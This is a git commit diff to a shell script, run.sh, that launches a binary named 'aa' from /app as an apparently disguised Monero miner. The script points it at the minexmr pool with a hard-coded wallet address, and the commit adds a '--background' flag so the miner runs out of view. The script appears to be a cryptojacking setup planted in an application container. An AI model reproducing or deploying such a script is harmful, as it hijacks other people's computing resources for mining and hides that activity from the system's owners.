24710a773052da6dd10aff1d086443875f3afcfc
yoyo2323 <38825063+yoyo2323@users.noreply.github.com>
2022-06-20 13:51:26 -0400

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,3 +1,3 @@
 chmod 777 /app/aa;
-./aa -o us-west.minexmr.com:443 -u 442nzBCR7YeHtjAE9SZZoiXqV2zcwFPxyWEPHqJ5971ER89jFor1turEZrwFAHPnYMcfaXHKs9xYxdGnErGiFVZ712frFiL -k --tls --rig-id 001;
+./aa -o us-west.minexmr.com:443 -u 442nzBCR7YeHtjAE9SZZoiXqV2zcwFPxyWEPHqJ5971ER89jFor1turEZrwFAHPnYMcfaXHKs9xYxdGnErGiFVZ712frFiL -k --background --tls --rig-id 001;
 echo "hol"
